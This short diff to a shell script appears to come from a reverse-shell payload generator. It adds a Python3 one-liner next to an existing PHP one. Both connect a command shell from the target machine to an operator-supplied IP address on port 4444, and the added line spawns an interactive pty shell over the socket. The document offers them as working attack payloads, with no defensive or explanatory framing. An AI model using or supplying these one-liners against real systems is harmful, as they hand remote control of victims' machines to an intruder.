@@ -316,6 +316,9 @@ do
 			elif [ "$shell_type" = "php" ]
 			then
 				rev_shell="php -r '\$sock=fsockopen(\"$ip_address\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+			elif [ "$shell_type" = "python3" ]
+			then
+				rev_shell="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
 			else
 				echo "Invalid shell type. Valid options are bash, python, or php."
 				exit 1
